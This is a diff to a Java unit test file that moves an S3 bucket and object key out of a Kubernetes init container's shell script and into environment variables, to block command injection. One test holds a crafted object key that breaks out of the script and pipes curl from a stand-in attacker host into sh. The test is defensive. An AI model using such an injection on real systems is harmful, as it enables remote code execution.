@@ -122,12 +122,48 @@ class PodSpecBuilderTest {
     var init = this.builder.build(this.request).getSpec().getInitContainers().getFirst();
 
     assertEquals("fetch-service-directory", init.getName());
-    assertTrue(String.join(" ", init.getCommand()).contains("services/cn-lobby-1-a3f9c2e1.tar"),
-      init.getCommand().toString());
     assertTrue(String.join(" ", init.getCommand()).contains("tar -xf"));
+    // The key itself travels in the environment - see the injection test below.
+    assertTrue(init.getEnv().stream()
+      .anyMatch(e -> e.getName().equals("S3_OBJECT_KEY")
+        && e.getValue().equals("services/cn-lobby-1-a3f9c2e1.tar")));
     assertTrue(init.getVolumeMounts().stream()
       .anyMatch(m -> m.getName().equals("service-dir")
         && m.getMountPath().equals("/cloudnet/service")));
+  }
+
+  @Test
+  void initContainerPassesBucketAndKeyAsEnvironmentNotAsShellText() {
+    // Interpolating either value into the /bin/sh -c string would let a crafted
+    // config or object key run arbitrary commands in the init container.
+    var init = this.builder.build(this.request).getSpec().getInitContainers().getFirst();
+    var script = String.join(" ", init.getCommand());
+
+    assertFalse(script.contains("services/cn-lobby-1-a3f9c2e1.tar"),
+      "the object key must not appear literally in the shell script: " + script);
+    assertTrue(script.contains("$S3_BUCKET"), script);
+    assertTrue(script.contains("$S3_OBJECT_KEY"), script);
+
+    var env = init.getEnv().stream()
+      .collect(java.util.stream.Collectors.toMap(e -> e.getName(), e -> e));
+    assertEquals("cloudnet-staging", env.get("S3_BUCKET").getValue());
+    assertEquals("services/cn-lobby-1-a3f9c2e1.tar", env.get("S3_OBJECT_KEY").getValue());
+  }
+
+  @Test
+  void shellMetacharactersInTheObjectKeyCannotEscapeIntoTheScript() {
+    var malicious = new PodSpecBuilder.PodRequest(
+      "Lobby-1", ID, "lobby", 4096, 25565, "node-1", "owner", "uid", null,
+      "services/x.tar\"; curl http://evil.example/x | sh; #",
+      List.of("java"));
+
+    var init = this.builder.build(malicious).getSpec().getInitContainers().getFirst();
+    var script = String.join(" ", init.getCommand());
+
+    assertFalse(script.contains("curl"), "payload leaked into the script: " + script);
+    assertTrue(init.getEnv().stream()
+      .anyMatch(e -> e.getName().equals("S3_OBJECT_KEY") && e.getValue().contains("curl")),
+      "the payload belongs in the environment, where it is inert data");
   }
 
   @Test
